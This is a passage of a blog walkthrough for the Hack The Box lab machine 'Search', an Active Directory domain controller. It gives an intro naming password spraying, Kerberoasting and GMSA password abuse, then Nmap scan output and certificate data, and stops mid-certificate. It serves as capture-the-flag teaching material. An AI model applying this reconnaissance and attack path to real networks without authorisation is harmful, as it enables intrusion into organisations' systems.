<!DOCTYPE html>
<html lang="en-us">
<head>
<title>Search HTB Walkthrough // 0xEr3bus's Blog</title>
<link href="/favicon.ico" rel="shortcut icon"/>
<meta charset="utf-8"/>
<meta content="Hugo 0.101.0" name="generator"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<meta content='Shashwat "0xEr3bus" Shah' name="author"/>
<meta content="" name="description"/>
<link href="https://blog.shashwatshah.me/css/main.css" rel="stylesheet"/>
<link href='https://fonts.googleapis.com/css?family=Share Tech Mono' rel='stylesheet'>
<link href="https://blog.shashwatshah.me/css/main.min.a71a4a856378aa6dfd258fda8ad7e4b04d91989123fd42db23f699f06cfdc9a3.css" rel="stylesheet"/>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
<meta content="summary" name="twitter:card"/>
<meta content="Search HTB Walkthrough" name="twitter:title"/>
<meta content="Search Search from Hackthebox submitted by dmw0ng. The machine is active directory-based. The machine Includes password spraying and Kerberoasting. The machine starts from port 80, where we find usernames, and eventually exploits GMSpassword. The machine’s stats given by the creator is HARD, but users have rated medium.
Recon Starting the recon with Nmap, we found Kerberos, LDAP, DNS, which tells us that we are dealing with the domain controller.
Nmap 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10." name="twitter:description"/>
<meta content="Search HTB Walkthrough" property="og:title"/>
<meta content="Search Search from Hackthebox submitted by dmw0ng. The machine is active directory-based. The machine Includes password spraying and Kerberoasting. The machine starts from port 80, where we find usernames, and eventually exploits GMSpassword. The machine’s stats given by the creator is HARD, but users have rated medium.
Recon Starting the recon with Nmap, we found Kerberos, LDAP, DNS, which tells us that we are dealing with the domain controller.
Nmap 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10." property="og:description"/>
<meta content="article" property="og:type"/>
<meta content="https://blog.shashwatshah.me/search/" property="og:url"/><meta content="posts" property="article:section"/>
<meta content="2022-04-30T00:00:00+00:00" property="article:published_time"/>
<meta content="2022-04-30T00:00:00+00:00" property="article:modified_time"/>
</head>
<body>
<header class="app-header">
<a href="https://blog.shashwatshah.me/"><img alt='Shashwat "0xEr3bus" Shah' class="app-header-avatar" src="/avatar.jpg"/></a>
<h1>0xEr3bus's Blog</h1>
<nav class="app-header-menu">
<a class="app-header-menu-item" href="/">Home</a>

             - 

          

          <a class="app-header-menu-item" href="/tags/">Tags</a>

             - 

          

          <a class="app-header-menu-item" href="/about/">About</a>
</nav>
<p>A blog where I discuss about red Teaming, Windows Exploitation, Walkthroughs</p>
<div class="app-header-social">
<a class="fab fa-github-square" href="https://github.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
<a class="fas fa-envelope-square" href="mailto:info@shashwatshah.me" rel="noreferrer noopener" target="_blank"></a>
<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
<a href="https://app.hackthebox.com/profile/606891" rel="noreferrer noopener" target="_blank"><img src="http://www.hackthebox.eu/badge/image/606891" alt="Hack The Box"></a>
<a href="https://tryhackme.com/p/TechyShashwat" rel="noreferrer noopener" target="_blank"><img src="https://tryhackme-badges.s3.amazonaws.com/TechyShashwat.png" alt="TryHackMe"></a>

</div>
</header>
<main class="app-container">
<article class="post">
<header class="post-header">
<h1 class="post-title">Search HTB Walkthrough</h1>
<div class="post-meta">
<div>
<svg class="icon icon-calendar" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>calendar</title>
<rect height="18" rx="2" ry="2" width="18" x="3" y="4"></rect><line x1="16" x2="16" y1="2" y2="6"></line><line x1="8" x2="8" y1="2" y2="6"></line><line x1="3" x2="21" y1="10" y2="10"></line>
</svg>

          Apr 30, 2022

        </div>
<div>
<svg class="icon icon-clock" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>clock</title>
<circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>

          17 min read

        </div>
<div>
<svg class="icon icon-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
<title>tag</title>
<path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
</svg>
<a class="tag" href="https://blog.shashwatshah.me/tags/active-directory/">Active-Directory</a>
<a class="tag" href="https://blog.shashwatshah.me/tags/gmsa-password/">GMSA-Password</a>
<a class="tag" href="https://blog.shashwatshah.me/tags/smb/">SMB</a>
<a class="tag" href="https://blog.shashwatshah.me/tags/certificate-pkcs#12/">Certificate-PKCS#12</a>
<a class="tag" href="https://blog.shashwatshah.me/tags/powershell/">Powershell</a>
</div>
</div>
</header>
<div class="post-content">
<h1 id="search">Search</h1>
<p>Search from Hackthebox submitted by <a href="https://app.hackthebox.com/users/610173">dmw0ng</a>. The machine is active directory-based. The machine Includes password spraying and Kerberoasting. The machine starts from port 80, where we find usernames, and eventually exploits GMSpassword. The machine’s stats given by the creator is <strong>HARD</strong>, but users have rated <strong>medium</strong>.</p>
<h2 id="recon">Recon</h2>
<p>Starting the recon with Nmap, we found Kerberos, LDAP, DNS, which tells us that we are dealing with the domain controller.</p>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;" tabindex="0"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#ae81ff">53</span><span style="color:#f92672">/</span>tcp    open  domain        syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Simple</span> <span style="color:#66d9ef">DNS</span> <span style="color:#66d9ef">Plus</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp    open  http          syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">IIS</span> httpd <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span><span style="color:#e6db74">header</span>: <span style="color:#66d9ef">Microsoft</span><span style="color:#f92672">-</span><span style="color:#66d9ef">IIS</span><span style="color:#f92672">/</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#66d9ef">Supported</span> <span style="color:#e6db74">Methods</span>: <span style="color:#66d9ef">OPTIONS</span> <span style="color:#66d9ef">TRACE</span> <span style="color:#66d9ef">GET</span> <span style="color:#66d9ef">HEAD</span> <span style="color:#66d9ef">POST</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  <span style="color:#66d9ef">Potentially</span> risky methods: <span style="color:#66d9ef">TRACE</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span><span style="color:#e6db74">title</span>: <span style="color:#66d9ef">Search</span> <span style="color:#f92672">&amp;</span>mdash; <span style="color:#66d9ef">Just</span> <span style="color:#66d9ef">Testing</span> <span style="color:#66d9ef">IIS</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>tcp    open  kerberos<span style="color:#f92672">-</span>sec  syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Kerberos</span> (server <span style="color:#e6db74">time</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">04</span>:<span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">23</span>Z)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc         syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp   open  netbios<span style="color:#f92672">-</span>ssn   syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> netbios<span style="color:#f92672">-</span>ssn
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">389</span><span style="color:#f92672">/</span>tcp   open  ldap          syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: search<span style="color:#f92672">.</span>htb0<span style="color:#f92672">.</span>, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span>research
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span>search<span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span><span style="color:#f92672">-</span><span style="color:#66d9ef">CA</span><span style="color:#f92672">/</span>domainComponent<span style="color:#f92672">=</span>search
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">type</span>: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">bits</span>: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Signature</span> <span style="color:#e6db74">Algorithm</span>: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">before</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">after</span>:  <span style="color:#ae81ff">2030</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">MD5</span>:   <span style="color:#ae81ff">073</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">614</span>f <span style="color:#ae81ff">7</span>bc0 <span style="color:#ae81ff">29</span>d0 <span style="color:#ae81ff">6</span>d1d <span style="color:#ae81ff">9</span>ea6 <span style="color:#ae81ff">3</span>cdb d99e
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">10</span>ae <span style="color:#ae81ff">5494</span> <span style="color:#ae81ff">29</span>d6 <span style="color:#ae81ff">1e44</span> <span style="color:#ae81ff">276</span>f b8a2 <span style="color:#ae81ff">24</span>ca fde9 de93 af78
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MIIFZzCCBE</span><span style="color:#f92672">+</span>gAwIBAgITVAAAABRx<span style="color:#f92672">/</span><span style="color:#66d9ef">RXdaDt</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>wAAAAAAFDANBgkqhkiG9w0BAQsF
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 							<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">/</span>lPqiPHGIs7mRW<span style="color:#f92672">/</span>zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>pdPzYPnCzHLoO<span style="color:#f92672">/</span><span style="color:#66d9ef">BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ</span><span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span><span style="color:#e6db74">date</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#e6db74">T04</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">18</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">443</span><span style="color:#f92672">/</span>tcp   open  ssl<span style="color:#f92672">/</span>http      syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">IIS</span> httpd <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span>research
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span>search<span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span><span style="color:#f92672">-</span><span style="color:#66d9ef">CA</span><span style="color:#f92672">/</span>domainComponent<span style="color:#f92672">=</span>search
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">type</span>: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">bits</span>: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Signature</span> <span style="color:#e6db74">Algorithm</span>: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">before</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">after</span>:  <span style="color:#ae81ff">2030</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">MD5</span>:   <span style="color:#ae81ff">073</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">614</span>f <span style="color:#ae81ff">7</span>bc0 <span style="color:#ae81ff">29</span>d0 <span style="color:#ae81ff">6</span>d1d <span style="color:#ae81ff">9</span>ea6 <span style="color:#ae81ff">3</span>cdb d99e
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">10</span>ae <span style="color:#ae81ff">5494</span> <span style="color:#ae81ff">29</span>d6 <span style="color:#ae81ff">1e44</span> <span style="color:#ae81ff">276</span>f b8a2 <span style="color:#ae81ff">24</span>ca fde9 de93 af78
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MIIFZzCCBE</span><span style="color:#f92672">+</span>gAwIBAgITVAAAABRx<span style="color:#f92672">/</span><span style="color:#66d9ef">RXdaDt</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>wAAAAAAFDANBgkqhkiG9w0BAQsF
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 							<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U</span><span style="color:#f92672">+</span><span style="color:#66d9ef">Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">/</span>lPqiPHGIs7mRW<span style="color:#f92672">/</span>zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>pdPzYPnCzHLoO<span style="color:#f92672">/</span><span style="color:#66d9ef">BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ</span><span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_<span style="color:#f92672">-----</span><span style="color:#66d9ef">END</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span><span style="color:#e6db74">header</span>: <span style="color:#66d9ef">Microsoft</span><span style="color:#f92672">-</span><span style="color:#66d9ef">IIS</span><span style="color:#f92672">/</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span><span style="color:#e6db74">title</span>: <span style="color:#66d9ef">Search</span> <span style="color:#f92672">&amp;</span>mdash; <span style="color:#66d9ef">Just</span> <span style="color:#66d9ef">Testing</span> <span style="color:#66d9ef">IIS</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_ssl<span style="color:#f92672">-</span><span style="color:#e6db74">date</span>: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span><span style="color:#e6db74">T04</span>:<span style="color:#ae81ff">21</span>:<span style="color:#ae81ff">18</span><span style="color:#f92672">+</span><span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>; <span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>s from scanner time<span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>   <span style="color:#66d9ef">Supported</span> <span style="color:#e6db74">Methods</span>: <span style="color:#66d9ef">OPTIONS</span> <span style="color:#66d9ef">TRACE</span> <span style="color:#66d9ef">GET</span> <span style="color:#66d9ef">HEAD</span> <span style="color:#66d9ef">POST</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  <span style="color:#66d9ef">Potentially</span> risky methods: <span style="color:#66d9ef">TRACE</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> tls<span style="color:#f92672">-</span><span style="color:#e6db74">alpn</span>: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span>_  http<span style="color:#f92672">/</span><span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds? syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">464</span><span style="color:#f92672">/</span>tcp   open  kpasswd5?     syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">593</span><span style="color:#f92672">/</span>tcp   open  ncacn_http    syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">RPC</span> over <span style="color:#66d9ef">HTTP</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">636</span><span style="color:#f92672">/</span>tcp   open  ssl<span style="color:#f92672">/</span>ldap      syn<span style="color:#f92672">-</span>ack ttl <span style="color:#ae81ff">127</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#66d9ef">Active</span> <span style="color:#66d9ef">Directory</span> <span style="color:#66d9ef">LDAP</span> (<span style="color:#e6db74">Domain</span>: search<span style="color:#f92672">.</span>htb0<span style="color:#f92672">.</span>, <span style="color:#e6db74">Site</span>: <span style="color:#66d9ef">Default</span><span style="color:#f92672">-</span><span style="color:#66d9ef">First</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Site</span><span style="color:#f92672">-</span><span style="color:#66d9ef">Name</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span><span style="color:#e6db74">cert</span>: <span style="color:#e6db74">Subject</span>: commonName<span style="color:#f92672">=</span>research
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">Issuer</span>: commonName<span style="color:#f92672">=</span>search<span style="color:#f92672">-</span><span style="color:#66d9ef">RESEARCH</span><span style="color:#f92672">-</span><span style="color:#66d9ef">CA</span><span style="color:#f92672">/</span>domainComponent<span style="color:#f92672">=</span>search
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">type</span>: rsa
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Public</span> <span style="color:#66d9ef">Key</span> <span style="color:#e6db74">bits</span>: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Signature</span> <span style="color:#e6db74">Algorithm</span>: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">before</span>: <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Not</span> valid <span style="color:#e6db74">after</span>:  <span style="color:#ae81ff">2030</span><span style="color:#f92672">-</span><span style="color:#ae81ff">08</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span><span style="color:#e6db74">T08</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">35</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#e6db74">MD5</span>:   <span style="color:#ae81ff">073</span><span style="color:#ae81ff">8</span> <span style="color:#ae81ff">614</span>f <span style="color:#ae81ff">7</span>bc0 <span style="color:#ae81ff">29</span>d0 <span style="color:#ae81ff">6</span>d1d <span style="color:#ae81ff">9</span>ea6 <span style="color:#ae81ff">3</span>cdb d99e
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">SHA</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">10</span>ae <span style="color:#ae81ff">5494</span> <span style="color:#ae81ff">29</span>d6 <span style="color:#ae81ff">1e44</span> <span style="color:#ae81ff">276</span>f b8a2 <span style="color:#ae81ff">24</span>ca fde9 de93 af78
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#f92672">-----</span><span style="color:#66d9ef">BEGIN</span> <span style="color:#66d9ef">CERTIFICATE</span><span style="color:#f92672">-----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MIIFZzCCBE</span><span style="color:#f92672">+</span>gAwIBAgITVAAAABRx<span style="color:#f92672">/</span><span style="color:#66d9ef">RXdaDt</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>wAAAAAAFDANBgkqhkiG9w0BAQsF
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq</span><span style="color:#f92672">/</span><span style="color:#66d9ef">Js</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> 							<span style="color:#f92672">[</span><span style="color:#66d9ef">SNIP</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa</span><span style="color:#f92672">/</span>b<span style="color:#f92672">/+</span><span style="color:#66d9ef">C0Zh5PlBWeoYLSru</span><span style="color:#f92672">+</span>
